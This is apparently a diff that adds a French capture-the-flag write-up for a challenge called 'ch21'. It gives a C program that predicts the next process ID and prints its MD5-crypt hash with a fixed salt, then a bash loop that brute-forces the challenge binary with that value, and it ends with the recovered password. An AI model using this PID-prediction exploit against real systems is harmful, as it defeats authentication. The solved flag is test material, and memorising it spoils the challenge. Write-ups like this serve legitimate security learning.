@@ -1,0 +1,22 @@
+La difficulte reside dans le fait qu'on doit passer en argument le resultat du cryptage basé sur le PID du programme.
+Il va donc falloir "prédire" le PID. Heureusement ils forment toujours une suite et le futur programme est certainement le PID actuel + 1.
+On va donc creer un programme C dans /tmp qui va renvoyer son PID+1 crypté comme il faut.
+
+------------------------------
+#include <crypt.h>
+#include <stdio.h>
+int main ()
+{
+    char    pid[16];
+    snprintf(pid, sizeof(pid), "%i", getpid()+1);
+    printf("%s", crypt(pid, "$1$awesome"));
+    return (0);
+}
+
+------------------------------
+
+On le compile avec l'option '-lcrypt' puis on execute execute le programme ch21 avec en parametre le resultat de ce programme, tout ceci dans une boucle afin d'etre sur d'y arriver si jamais le futur PID n'est pas PID+1
+
+while true; do ~/ch21 `/tmp/a.out`; done
+
+resultat = -/q2/a9d6e31D
